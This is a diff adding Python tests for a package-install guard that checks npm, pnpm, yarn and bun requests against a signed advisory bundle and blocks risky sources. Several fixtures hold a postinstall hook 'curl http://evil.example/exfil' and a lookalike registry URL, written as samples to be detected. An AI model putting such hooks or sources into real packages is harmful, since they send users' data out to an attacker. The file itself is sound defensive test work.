@@ -1,0 +1,796 @@
+"""Phase 11 JavaScript evaluator behavior tests."""
+
+from __future__ import annotations
+
+import base64
+import hashlib
+import json
+from datetime import datetime, timedelta, timezone
+from pathlib import Path
+
+import pytest
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, generate_private_key
+
+from codex_plugin_scanner.guard.local_supply_chain import evaluate_package_request_artifact
+from codex_plugin_scanner.guard.runtime.package_intent_common import build_package_request_artifact
+from codex_plugin_scanner.guard.runtime.package_intent_parser import parse_package_intent
+from codex_plugin_scanner.guard.store import GuardStore
+from tests.native_workspace import bind_workspace
+from tests.package_review_settings import review_package_signals
+
+pytestmark = pytest.mark.usefixtures("package_intent_native")
+
+WORKSPACE_ID = "workspace-alpha"
+
+
+def _write_text(path: Path, text: str) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(text, encoding="utf-8")
+
+
+def _iso(value: datetime) -> str:
+    return value.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")
+
+
+def _generate_key_pair() -> tuple[bytes, bytes]:
+    private_key = generate_private_key(public_exponent=65537, key_size=2048)
+    private_pem = private_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.PKCS8,
+        encryption_algorithm=serialization.NoEncryption(),
+    )
+    public_pem = private_key.public_key().public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo,
+    )
+    return private_pem, public_pem
+
+
+def _fingerprint(public_key_pem: bytes) -> str:
+    return hashlib.sha256(public_key_pem.decode("utf-8").strip().encode("utf-8")).hexdigest()
+
+
+def _package(
+    *,
+    name: str,
+    version: str,
+    default_action: str,
+    namespace: str | None = None,
+    normalized_severity: str = "critical",
+    recommended_fix_version: str | None = "1.2.9",
+) -> dict[str, object]:
+    return {
+        "confidence": 990,
+        "defaultAction": default_action,
+        "ecosystem": "npm",
+        "exploitLevel": "active",
+        "knownExploited": True,
+        "malwareState": "known",
+        "name": name,
+        "namespace": namespace,
+        "normalizedSeverity": normalized_severity,
+        "packageAgeState": "watch",
+        "purl": f"pkg:npm/{namespace}/{name}@{version}" if namespace is not None else f"pkg:npm/{name}@{version}",
+        "reachability": "reachable",
+        "recommendedFixVersion": recommended_fix_version,
+        "relatedAdvisoryIds": ["GHSA-vh95-rmgr-6w4m"],
+        "riskScore": 980,
+        "sourceIntegrityState": "high-risk",
+        "version": version,
+    }
+
+
+def _bundle_response(
+    *,
+    packages: list[dict[str, object]],
+    policy_rules: list[dict[str, object]] | None = None,
+) -> dict[str, object]:
+    generated_at = datetime(2026, 5, 19, tzinfo=timezone.utc)
+    expires_at = generated_at + timedelta(hours=12)
+    bundle = {
+        "advisories": [
+            {
+                "advisoryId": "GHSA-vh95-rmgr-6w4m",
+                "aliases": ["CVE-2020-7598"],
+                "confidence": 990,
+                "exploitLevel": "active",
+                "knownExploited": True,
+                "malwareState": "known",
+                "normalizedSeverity": "critical",
+                "recommendedFixVersion": "1.2.9",
+                "sourceKey": "ghsa",
+                "summary": "Prototype pollution in minimist",
+                "title": "Prototype pollution in minimist",
+            }
+        ],
+        "bundleVersion": "1747612800000-deadbeef",
+        "expiresAt": _iso(expires_at),
+        "feedSnapshotHash": "feed-snapshot-1",
+        "generatedAt": _iso(generated_at),
+        "keyId": "guard-bundle-key-2026-05",
+        "packages": packages,
+        "policyHash": "policy-hash-1",
+        "policyRules": policy_rules or [],
+        "scoringVersion": "scf-v1",
+        "sourceHashes": [{"payloadHash": "ghsa-feed-hash", "sourceKey": "ghsa", "staleStatus": "fresh"}],
+        "tier": "premium",
+        "workspaceId": WORKSPACE_ID,
+    }
+    private_key_pem, public_key_pem = _generate_key_pair()
+    loaded_key = serialization.load_pem_private_key(private_key_pem, password=None)
+    assert isinstance(loaded_key, RSAPrivateKey)
+    canonical_payload = json.dumps(bundle, sort_keys=True, separators=(",", ":")).encode("utf-8")
+    payload_hash = hashlib.sha256(canonical_payload).hexdigest()
+    signature = loaded_key.sign(
+        canonical_payload,
+        padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
+        hashes.SHA256(),
+    )
+    return {
+        "bundle": bundle,
+        "payloadHash": payload_hash,
+        "signature": base64.b64encode(signature).decode("utf-8"),
+        "signatureAlgorithm": "rsa-pss-sha256",
+        "verificationKeys": [
+            {
+                "fingerprintSha256": _fingerprint(public_key_pem),
+                "keyId": "guard-bundle-key-2026-05",
+                "publicKeyPem": public_key_pem.decode("utf-8").strip(),
+                "state": "active",
+                "validUntil": None,
+            }
+        ],
+    }
+
+
+def _artifact_from_command(command: str, *, workspace: Path) -> object:
+    intent = parse_package_intent(command, workspace=workspace)
+    assert intent is not None
+    return build_package_request_artifact("codex", intent, config_path="codex.json", source_scope="project")
+
+
+def test_evaluate_package_request_artifact_uses_package_lock_exact_version_for_npm_ranges(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo","dependencies":{"minimist":"^1.2.0"}}\n')
+    _write_text(
+        workspace_dir / "package-lock.json",
+        '{"lockfileVersion":3,"packages":{"":{"dependencies":{"minimist":"^1.2.0"}},"node_modules/minimist":{"version":"1.2.8"}}}\n',
+    )
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm install minimist@^1.2.0", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["requestedVersion"] == "^1.2.0"
+    assert result.packages[0]["resolvedVersion"] == "1.2.8"
+
+
+@pytest.mark.parametrize(
+    ("command", "expected_next_step"),
+    [
+        ("pnpm add minimist@1.2.8", "pnpm add minimist@1.2.9"),
+        ("yarn add minimist@1.2.8", "yarn add minimist@1.2.9"),
+        ("bun add minimist@1.2.8", "bun add minimist@1.2.9"),
+    ],
+)
+def test_evaluate_package_request_artifact_uses_manager_specific_fix_command(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    command: str,
+    expected_next_step: str,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command(command, workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.user_copy.next_step == expected_next_step
+
+
+@pytest.mark.parametrize(
+    ("command", "expected_decision", "expected_code"),
+    [
+        ("npm install guard-github@github:hashgraph-online/hol-guard", "ask", "git_dependency_source"),
+        ("npm install guard-http@http://example.com/guard.tgz", "block", "insecure_source_url"),
+        ("npm install guard-https@https://example.com/guard.tgz", "ask", "external_tarball_source"),
+        ("npm install guard-query@https://example.com/guard.tgz?token=demo", "ask", "external_tarball_source"),
+        (
+            "npm install guard-lookalike@https://registry.npmjs.org.evil.com/guard.tgz",
+            "ask",
+            "external_tarball_source",
+        ),
+    ],
+)
+def test_evaluate_package_request_artifact_applies_js_source_heuristics(
+    tmp_path: Path,
+    command: str,
+    expected_decision: str,
+    expected_code: str,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    review_package_signals(home_dir)
+
+    artifact = _artifact_from_command(command, workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == expected_decision
+    assert result.packages[0]["reasons"][0]["code"] == expected_code
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "git+https://github.com/hashgraph-online/hol-guard.git#main",
+        "git+ssh://git@github.com/hashgraph-online/hol-guard.git#main",
+        "git://github.com/hashgraph-online/hol-guard.git#main",
+        "ssh://git@github.com/hashgraph-online/hol-guard.git#main",
+        "git@github.com:hashgraph-online/hol-guard.git#main",
+        "github:hashgraph-online/hol-guard#main",
+        "gitlab:hashgraph-online/hol-guard#main",
+        "bitbucket:hashgraph-online/hol-guard#main",
+        "hashgraph-online/hol-guard#main",
+        "https://github.com/hashgraph-online/hol-guard.git#main",
+    ],
+)
+def test_every_npm_git_source_form_requires_local_review_before_registry_or_cloud(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    source: str,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    review_package_signals(home_dir)
+
+    def fail_cloud_lookup() -> str:
+        raise AssertionError("Git source must not reach registry/cloud evaluation")
+
+    monkeypatch.setattr(store, "get_cloud_workspace_id", fail_cloud_lookup)
+
+    artifact = _artifact_from_command(f"npm install {source}", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "ask"
+    assert result.packages[0]["reasons"][0]["code"] == "git_dependency_source"
+    assert result.packages[0]["sourceIdentity"].startswith("git:")
+    assert result.packages[0]["sourceRevisionKind"] == "mutable_ref"
+
+
+def test_npm_git_source_cannot_hide_registry_targets_in_one_request(tmp_path: Path) -> None:
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    artifact = _artifact_from_command(
+        "npm install minimist@1.2.8 github:hashgraph-online/hol-guard#main",
+        workspace=workspace_dir,
+    )
+
+    result = evaluate_package_request_artifact(
+        artifact=artifact,
+        store=GuardStore(tmp_path / "home"),
+        workspace_dir=workspace_dir,
+    )
+
+    assert result.decision == "block"
+    assert result.packages[0]["reasons"][0]["code"] == "npm_source_mixed_request_unsupported"
+
+
+def test_invalid_npm_source_blocks_before_cloud_and_redacts_credentials(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(tmp_path / "home")
+    monkeypatch.setattr(
+        store,
+        "get_cloud_workspace_id",
+        lambda: pytest.fail("invalid source must not reach cloud evaluation"),
+    )
+
+    artifact = _artifact_from_command(
+        "npm install https://user:VERY_SECRET@github.com/hashgraph-online/hol-guard.git#main",
+        workspace=workspace_dir,
+    )
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["reasons"][0]["code"] == "npm_source_ambiguous_userinfo"
+    assert "VERY_SECRET" not in json.dumps(artifact.metadata)
+    assert "VERY_SECRET" not in json.dumps(result.to_cache_dict())
+
+
+def test_evaluate_package_request_artifact_uses_source_specific_risk_summary_for_reviewed_tarballs(
+    tmp_path: Path,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    review_package_signals(home_dir)
+
+    artifact = _artifact_from_command(
+        "npm install guard-query@https://example.com/guard.tgz?token=demo", workspace=workspace_dir
+    )
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "ask"
+    assert "external tarball source" in result.risk_summary.lower()
+
+
+@pytest.mark.parametrize(
+    ("command", "lockfile_name", "lockfile_text"),
+    [
+        (
+            "pnpm add minimist@^1.2.0",
+            "pnpm-lock.yaml",
+            """
+lockfileVersion: '9.0'
+importers:
+  .:
+    dependencies:
+      minimist:
+        specifier: ^1.2.0
+        version: 1.2.8
+packages:
+  minimist@1.2.8:
+    resolution: {integrity: sha512-demo}
+""",
+        ),
+        (
+            "pnpm add minimist@^1.2.0",
+            "pnpm-lock.yaml",
+            """
+lockfileVersion: 5.4
+specifiers:
+  minimist: ^1.2.0
+dependencies:
+  minimist: 1.2.8
+packages:
+  /minimist/1.2.8:
+    resolution: {integrity: sha512-demo}
+""",
+        ),
+        (
+            "yarn add minimist@^1.2.0",
+            "yarn.lock",
+            """
+__metadata:
+  version: 4
+  cacheKey: 8
+
+"minimist@^1.2.0":
+  version "1.2.8"
+""",
+        ),
+        (
+            "bun add minimist@^1.2.0",
+            "bun.lock",
+            '{"lockfileVersion":1,"packages":{"minimist":["minimist@1.2.8","",{}]}}',
+        ),
+    ],
+)
+def test_evaluate_package_request_artifact_resolves_ranges_from_supported_js_lockfiles(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    command: str,
+    lockfile_name: str,
+    lockfile_text: str,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo","dependencies":{"minimist":"^1.2.0"}}\n')
+    _write_text(workspace_dir / lockfile_name, lockfile_text.strip() + "\n")
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command(command, workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["resolvedVersion"] == "1.2.8"
+
+
+def test_evaluate_package_request_artifact_npm_audit_fix_scans_existing_lockfile_context(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "package-lock.json",
+        '{"dependencies":{"minimist":{"version":"1.2.8"}}}\n',
+    )
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm audit fix --package-lock-only", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["dependencyPath"] in {"minimist", "node_modules/minimist"}
+
+
+def test_evaluate_package_request_artifact_matches_transitive_js_lockfile_names_without_pypi_normalization(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(
+        workspace_dir / "package.json",
+        """
+{
+  "name": "demo",
+  "dependencies": {
+    "express": "^4.18.2"
+  }
+}
+""".strip()
+        + "\n",
+    )
+    _write_text(
+        workspace_dir / "package-lock.json",
+        """
+{
+  "name": "demo",
+  "lockfileVersion": 3,
+  "packages": {
+    "": {
+      "dependencies": {
+        "express": "^4.18.2"
+      }
+    },
+    "node_modules/express": {
+      "name": "express",
+      "version": "4.18.2",
+      "dependencies": {
+        "left_pad": "1.3.0"
+      }
+    },
+    "node_modules/left_pad": {
+      "name": "left_pad",
+      "version": "1.3.0"
+    }
+  }
+}
+""".strip()
+        + "\n",
+    )
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(
+            packages=[
+                _package(
+                    name="left_pad",
+                    version="1.3.0",
+                    default_action="block",
+                    recommended_fix_version="1.3.1",
+                )
+            ]
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm install express@4.18.2", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert any(package["name"] == "left_pad" for package in result.packages)
+
+
+def test_an_older_yarn_lock_copy_of_a_direct_dependency_is_audited(tmp_path: Path) -> None:
+    # Another package pins lodash 3, so yarn.lock resolves it twice. Requesting
+    # lodash 4 does not make the installed lodash 3 copy a direct target.
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo","dependencies":{"lodash":"^4.17.21"}}\n')
+    _write_text(
+        workspace_dir / "yarn.lock",
+        """
+# yarn lockfile v1
+
+lodash@^3.10.0:
+  version "3.10.1"
+
+lodash@^4.17.21:
+  version "4.17.21"
+""".strip()
+        + "\n",
+    )
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(
+            packages=[
+                _package(name="lodash", version="3.10.1", default_action="block", recommended_fix_version="4.17.21")
+            ]
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("yarn add lodash@4.17.21", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    blocked = [package for package in result.packages if package["decision"] == "block"]
+    assert [(package["name"], package["resolvedVersion"]) for package in blocked] == [("lodash", "3.10.1")]
+
+
+def test_an_older_yarn_lock_copy_listed_after_the_direct_one_is_audited(tmp_path: Path) -> None:
+    # The direct selector comes first in yarn.lock, so the lockfile's order
+    # does not say which lodash copy the request resolves to.
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo","dependencies":{"lodash":"^4.17.21"}}\n')
+    _write_text(
+        workspace_dir / "yarn.lock",
+        """
+# yarn lockfile v1
+
+lodash@^4.17.21:
+  version "4.17.21"
+
+lodash@~3.10.0:
+  version "3.10.1"
+""".strip()
+        + "\n",
+    )
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(
+            packages=[
+                _package(name="lodash", version="3.10.1", default_action="block", recommended_fix_version="4.17.21")
+            ]
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("yarn add lodash@^4.17.21", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    blocked = [package for package in result.packages if package["decision"] == "block"]
+    assert [(package["name"], package["resolvedVersion"]) for package in blocked] == [("lodash", "3.10.1")]
+
+
+def test_evaluate_package_request_artifact_blocks_local_package_with_install_scripts(tmp_path: Path) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "fixtures" / "evil-package" / "package.json",
+        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
+    )
+    store = GuardStore(home_dir)
+
+    artifact = _artifact_from_command("npm install ./fixtures/evil-package", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["name"] == "evil-package"
+    assert result.packages[0]["reasons"][0]["code"] == "install_script_risk"
+
+
+def test_evaluate_package_request_artifact_allows_local_package_when_ignore_scripts_is_set(tmp_path: Path) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "fixtures" / "evil-package" / "package.json",
+        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
+    )
+    store = GuardStore(home_dir)
+
+    artifact = _artifact_from_command("npm install --ignore-scripts ./fixtures/evil-package", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "allow"
+    assert result.packages[0]["reasons"][0]["code"] == "ignore_scripts_applied"
+
+
+def test_evaluate_package_request_artifact_blocks_file_source_local_package_install_scripts(tmp_path: Path) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "fixtures" / "evil-package" / "package.json",
+        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
+    )
+    store = GuardStore(home_dir)
+
+    artifact = _artifact_from_command("npm install evil-package@file:./fixtures/evil-package", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["reasons"][0]["code"] == "install_script_risk"
+
+
+def test_evaluate_package_request_artifact_uses_alias_in_fix_copy(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(packages=[_package(name="minimist", version="1.2.8", default_action="block")]),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm install guard-safe@npm:minimist@1.2.8", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["alias"] == "guard-safe"
+    assert result.user_copy.next_step == "npm install guard-safe@npm:minimist@1.2.9"
+
+
+def test_evaluate_package_request_artifact_blocks_dependency_confusion_targets_from_policy(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(
+            packages=[],
+            policy_rules=[
+                {
+                    "action": "block",
+                    "ruleId": "reserve-internal-tool",
+                    "ecosystemSelector": "npm",
+                    "enabled": True,
+                    "expiresAt": None,
+                    "harnessSelector": None,
+                    "packageSelector": "@hashgraph/internal-tool",
+                    "priority": 1,
+                    "severityThreshold": None,
+                    "versionRangeSelector": None,
+                }
+            ],
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm install internal-tool@1.0.0", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["reasons"][0]["code"] == "dependency_confusion_risk"
+
+
+def test_evaluate_package_request_artifact_records_bun_lockb_binary_fallback(tmp_path: Path) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    (workspace_dir / "bun.lockb").write_bytes(b"bunlock")
+    store = GuardStore(home_dir)
+    review_package_signals(home_dir)
+
+    artifact = _artifact_from_command("bun add left-pad@1.3.0", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "ask"
+    assert result.packages[0]["reasons"][0]["code"] == "bun_lockfile_binary_fallback"
+    assert "binary lockfile" in result.reasons[0]["message"]
+
+
+@pytest.mark.parametrize("reverse_bundle_order", [False, True])
+def test_transitive_scoped_and_unscoped_packages_keep_distinct_bundle_actions(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    reverse_bundle_order: bool,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "package-lock.json",
+        json.dumps(
+            {
+                "lockfileVersion": 3,
+                "packages": {
+                    "": {"name": "demo"},
+                    "node_modules/pkg": {"name": "pkg", "version": "1.2.3"},
+                    "node_modules/@scope/pkg": {"name": "@scope/pkg", "version": "1.2.3"},
+                },
+            }
+        ),
+    )
+    packages = [
+        _package(name="pkg", version="1.2.3", default_action="warn", recommended_fix_version=None),
+        _package(
+            name="pkg",
+            namespace="@scope",
+            version="1.2.3",
+            default_action="block",
+            recommended_fix_version=None,
+        ),
+    ]
+    if reverse_bundle_order:
+        packages.reverse()
+    store = GuardStore(home_dir)
+    bind_workspace(store, WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(packages=packages),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm audit fix --package-lock-only", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+    decisions = {(package["namespace"], package["name"]): package["decision"] for package in result.packages}
+
+    assert decisions[(None, "pkg")] == "warn"
+    assert decisions[("@scope", "pkg")] == "block"
+    scoped = next(package for package in result.packages if package["namespace"] == "@scope")
+    assert "@scope/pkg@1.2.3" in scoped["reasons"][0]["message"]
